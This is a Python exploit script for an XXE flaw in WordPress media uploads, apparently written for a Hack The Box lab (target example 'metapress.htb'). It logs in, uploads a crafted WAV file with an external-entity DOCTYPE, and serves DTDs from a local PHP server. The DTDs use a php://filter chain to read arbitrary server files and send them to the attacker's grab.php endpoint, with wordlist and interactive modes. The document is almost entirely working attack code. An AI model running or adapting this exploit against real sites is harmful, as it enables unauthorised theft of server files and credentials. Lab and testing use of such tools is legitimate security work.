#!/usr/bin/env python3

import re
from os.path import join, exists
from os import _exit as main_exit
from base64 import b64encode
from os import makedirs, stat, access, R_OK, W_OK
from urllib.parse import urlparse, quote
import requests
from threading import Thread
from argparse import ArgumentParser
from json import loads
from json.decoder import JSONDecodeError
from subprocess import Popen, PIPE, STDOUT

verb = False

#########################
# [ PRINTING UTILITIES] #
#########################

GLOBAL_COLORS = True

class Colors:
    ansi_reset = '\033[0m'
    ansi_grey = '\033[90m'
    ansi_red = '\033[91m'
    ansi_green = '\033[92m'
    ansi_yellow = '\033[93m'
    ansi_blue = '\033[94m'

    @classmethod
    def red(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_red}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def green(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_green}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def yellow(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_yellow}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def blue(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_blue}{msg}{cls.ansi_reset}"
        return msg

    @classmethod
    def grey(cls, msg):
        if GLOBAL_COLORS:
            return f"{cls.ansi_grey}{msg}{cls.ansi_reset}"
        return msg

def print_success(msg):
    print(Colors.green(f"[+] {msg}"))

def print_warning(msg):
    print(Colors.yellow(f"[!] {msg}"))

def print_error(msg):
    print(Colors.red(f"[-] {msg}"))

def print_info(msg):
    print(Colors.blue(f"[*] {msg}"))

def print_bg(msg):
    print(Colors.grey(f"[-] {msg}"))

def print_verbose(msg):
    if verb: print(f"[V] {msg}")

def print_banner(): 
    print("""
▒██   ██▒▒██   ██▒▓█████      █████▒██▓ ██▓    ▓█████    ▓█████▄  █    ██  ███▄ ▄███▓ ██▓███  ▓█████  ██▀███  
▒▒ █ █ ▒░▒▒ █ █ ▒░▓█   ▀    ▓██   ▒▓██▒▓██▒    ▓█   ▀    ▒██▀ ██▌ ██  ▓██▒▓██▒▀█▀ ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
░░  █   ░░░  █   ░▒███      ▒████ ░▒██▒▒██░    ▒███      ░██   █▌▓██  ▒██░▓██    ▓██░▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒  ░ █ █ ▒ ▒▓█  ▄    ░▓█▒  ░░██░▒██░    ▒▓█  ▄    ░▓█▄   ▌▓▓█  ░██░▒██    ▒██ ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ▒██▒▒██▒ ▒██▒░▒████▒   ░▒█░   ░██░░██████▒░▒████▒   ░▒████▓ ▒▒█████▓ ▒██▒   ░██▒▒██▒ ░  ░░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░░░ ▒░ ░    ▒ ░   ░▓  ░ ▒░▓  ░░░ ▒░ ░    ▒▒▓  ▒ ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░░░   ░▒ ░ ░ ░  ░    ░      ▒ ░░ ░ ▒  ░ ░ ░  ░    ░ ▒  ▒ ░░▒░ ░ ░ ░  ░      ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░    ░     ░       ░ ░    ▒ ░  ░ ░      ░       ░ ░  ░  ░░░ ░ ░ ░      ░   ░░          ░     ░░   ░ 
 ░    ░   ░    ░     ░  ░           ░      ░  ░   ░  ░      ░       ░            ░               ░  ░   ░     
                                                          ░                                                   
                                                                      
               _______    ________    ___   ____ ___  ___     ___  ____  __ __  __ _______
              / ____/ |  / / ____/   |__ \ / __ \__ \<  /    |__ \/ __ \/ // / / // /__  /
             / /    | | / / __/________/ // / / /_/ // /_______/ / /_/ / // /_/ // /_ / / 
            / /___  | |/ / /__/_____/ __// /_/ / __// /_____/ __/\__, /__  __/__  __// /  
            \____/  |___/_____/    /____/\____/____/_/     /____/____/  /_/    /_/  /_/   
                                                                                                                                                                                                                                                                                                                                                                                   
    """)

#########################

evil_server = ''

def init_params():
    p = ArgumentParser()
    p.add_argument('-u', '--username', dest='username', help='Username to user in authenticated upload', required=True)
    p.add_argument('-p', '--password', dest='password', help='Password to user in authenticated upload', required=True)
    p.add_argument('-t', '--target', dest='target', help='Remote host to target, e.g. "metapress.htb"', required=True)
    p.add_argument('-lh', '--host', dest='lhost', help='Hostname on which server is bound (default "")', default='', required=True)
    p.add_argument('-lp', '--port', dest='lport', help='Listening port (default "8080")', default='8080')
    p.add_argument('-w', '--wordlist', dest='wordlist', help='Wordlist of filenames to be fetched')
    p.add_argument('-i', '--interactive', dest='interactive', help='Runs in interactive mode', action='store_true')
    p.add_argument('-v', '--verbose', dest='verb', help='Enables verbose mode', action='store_true')
    p.add_argument('-s', '--skip', dest="skip", help='Skip php server spin-up (MAKE SURE IT IS ALREADY RUNNING!)', action='store_true')
    p.add_argument('filenames', nargs='*', default=[], help='Filenames to fetch')

    args = p.parse_args()

    global verb
    verb = args.verb

    # Validate given parameters
    ensure_dir("./dtd")
    ensure_dir("./dump")
    if args.wordlist and not readable_file(args.wordlist): 
        print_error(f"Could not read {args.wordlist}, ignoring it.")
        args.wordlist = ''
    try:
        args.lport = int(args.lport)
    except ValueError as e:
        print_error(f"Bad port given: {args.lport}")
        print_verbose(f"Exception: {e}")
        quit(-1)
    up = urlparse(args.target)
    if not up.scheme: args.target = up.path # URL Given: sub.dom.tld
    else: args.target = up.netloc           # URL Given: scheme://sub.dom.tld/path/

    global evil_server
    evil_server = f"{args.lhost}:{args.lport}"

    return args

def ensure_dir(d):
    if not exists(d): 
        print_warning(f"{d} does not exists, but I can try to create it. Human, behold true power!")
        makedirs(d)
        if not exists(d): 
            print_error(f"Forgive me, I've failed...")
            exit(-1)

def run_php(lhost, lport):
    p = Popen(f"php -S {lhost}:{lport}", shell=True, stdout=PIPE, stderr=STDOUT)
    while True:
        line = p.stdout.readline()
        if not line: break
        print_bg(f"{line.decode('utf-8').strip()}")
    print_error("Server closed, exiting...")
    main_exit(-1)

def readable_file(file, mode=R_OK):
    if not exists(file):
        print_error(f'File {file} does not exist')
        return False

    if stat(file).st_size == 0:
        print_error(f'File {file} is empty')
        return False

    if not access(file, mode):
        if mode == R_OK:
            print_error(f'Cannot read file {file}')
            return False
        if mode == W_OK:
            print_error(f'Cannot write file {file}')
            return False
    return True

def encode_filename(fname):
    return quote(b64encode(bytes(fname, 'utf-8')), safe='=')

def upload_wav(fname, username, password, rhost, lhost, lport):
    postData = {
    'log': username,
    'pwd': password,
    'wp-submit':'Log In',
    'redirect_to': f"http://{rhost}/wp-admin/",
    'testcookie':1
    }
    r = requests.post(f"http://{rhost}/wp-login.php",data=postData, verify=False) # SSL == verify=True
    cookies = r.cookies

    print_info("Getting Wp Nonce...")
    res = requests.get(f"http://{rhost}/wp-admin/media-new.php",cookies=cookies)
    wp_nonce_list = re.findall(r'name="_wpnonce" value="(\w+)"',res.text)

    if len(wp_nonce_list) == 0 :
        print_error("Failed to retrieve the _wpnonce")
        print_verbose("RESPONSE:\n" + res.text)
        exit(-1)
    else :
        wp_nonce = wp_nonce_list[0]
        print_success(f"Wp Nonce retrieved successfully! _wpnonce: {wp_nonce}")

    print_verbose("Uploading the wav file...")
    postData = {
      'name': 'payload.wav',
      'action': 'upload-attachment',
      '_wpnonce': wp_nonce
    }

    encf = encode_filename(fname)

    print_info(f'Preparing dtd for file "{fname}" (ID "{encf}")')
    evil_dtd = f'<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource={fname}">\n<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM \'http://{evil_server}/grab.php?c={encf}::%file;\'>" >\n'
    with open(join('dtd', encf + '.dtd'), 'w') as outdtd:
        print_verbose(f"Writing into {join('dtd', encf + '.dtd')}")
        outdtd.write(evil_dtd)

    print_info(f'Asking file "{fname}" (ID: "{encf}")')
    wav_file_content = b'RIFF\xb8\xff\x00\x00WAVEiXML\x7b\xff\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \'' + bytes(f"http://{lhost}:{lport}/dtd/{encf}.dtd", 'utf-8') + b'\'>%remote;%init;%trick;] >\x00'
    print_verbose(f"PAYLOAD:\n{repr(wav_file_content)}")
    wav = {'async-upload': ('payload.wav', wav_file_content)}
    r_upload = requests.post(f"http://{rhost}/wp-admin/async-upload.php", data=postData, files=wav, cookies=cookies)
    if r_upload.status_code == 200:
        print_verbose(f"UPLOAD RESPONSE:\n{r_upload.text}")
        try:
            resp_json = loads(r_upload.text)
            print_success(f"Uploaded succesfully at \"{resp_json['data']['url']}\"")
        except JSONDecodeError as jsonerr:
            print_warning(f"Got 200 OK but JSON looks bad, trying anyway.")
            print_verbose(f"Exception: {jsonerr}")
        except Exception as e:
            print_error(f"Something went wrong, try againt with vebose on.")
            print_verbose(f"Exception: {e}")
    else: 
        print_error(f"Bad status code received: {r_upload.status_code}.")

if __name__ == "__main__":
    print_banner()
    args = init_params()

    if not args.skip:
        thread = Thread(target=run_php, args=(args.lhost, args.lport, ))
        thread.start()

    if args.wordlist:
        print_verbose(f"Processing wordlist")
        with open(args.wordlist) as wrdlst:
            for fname in wrdlst: upload_wav(fname.rstrip(), args.username, args.password, args.target, args.lhost, args.lport)
    
    if args.filenames:
        print_verbose(f"Processing cli files")
        for f in args.filenames: upload_wav(f.rstrip(), args.username, args.password, args.target, args.lhost, args.lport)
    
    if args.interactive:
        while True:
            try:
                upload_wav(input("File to fetch > ").rstrip(), args.username, args.password, args.target, args.lhost, args.lport)
            except KeyboardInterrupt as kb:
                print()
                break